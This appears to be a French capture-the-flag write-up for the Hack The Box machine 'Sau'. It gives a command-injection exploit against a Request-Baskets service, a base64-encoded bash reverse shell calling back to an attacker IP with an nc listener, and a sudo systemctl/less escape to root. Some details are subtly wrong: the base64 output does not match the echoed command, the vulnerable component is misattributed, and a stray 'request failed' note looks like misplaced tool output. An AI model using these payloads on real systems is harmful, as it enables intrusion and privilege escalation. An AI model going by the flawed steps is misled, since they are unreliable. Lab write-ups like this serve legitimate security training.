---
title: 'SAU - Hack the box'
description: 'Machine SAU de HTB'
pubDate: 'Aug 08 2025'
heroImage: '../../assets/sau.jpg'
---

# Reconnaissance

## Scan Nmap
```bash
nmap -sV -p- 10.129.225.56
```
> Un port inattendu est découvert : **55555/tcp**.

---

# Exploitation Web

## 1. Identification du service
En visitant `http://10.129.225.56:55555/guum71j`, on tombe sur une interface **Request-Basket** (outil de collecte de requêtes HTTP).  
Cette version est vulnérable à une injection de commande via le champ `username` d’un formulaire POST.

> ⚠️ *Analyse réseau : la requête vers cette URL a échoué (timeout ou blocage). Vérifiez que l’adresse est correcte et ré-essayez si vous souhaitez un dump détaillé de la page.*

## 2. Préparation du reverse-shell
Payload Bash :
```bash
bash -i >& /dev/tcp/10.10.14.104/9001 0>&1
```
Encodage en Base64 (sans caractère `+`) :
```bash
echo -n "bash -i >& /dev/tcp/10.10.14.104/9001 0>&1" | base64 -w0
# Résultat :
YmFzaCAgLWkgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjEwNC85MDAxICAwPiYx
```

## 3. Lancement du listener & exploitation
Sur la machine attaquante :
```bash
nc -lnvp 9001
```
Depuis la cible (via curl) :
```bash
curl http://10.129.225.56:55555/guum71j \
  -d 'username=;`echo YmFzaCAgLWkgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjEwNC85MDAxICAwPiYx | base64 -d | bash`'
```
> Shell interactif obtenu.

---

# Élévation de privilèges

## 1. Vérification des droits sudo
```bash
sudo -l
```
Sortie :
```txt
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
La version SystemD 245 est obsolète et connue pour autoriser l’évasion via less.

```bash
sudo /usr/bin/systemctl status trail.service
```
Dans le pager `less` qui s’ouvre :
1. Tapez `!/bin/bash` puis Entrée.
2. Vous obtenez un shell root.

Vérification :
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

# Résumé
1. Port 55555 → Request-Basket vulnérable.  
2. Injection de commande → shell en tant qu’utilisateur courant.  
3. `sudo systemctl status trail.service` → évasion via `less` → **root**.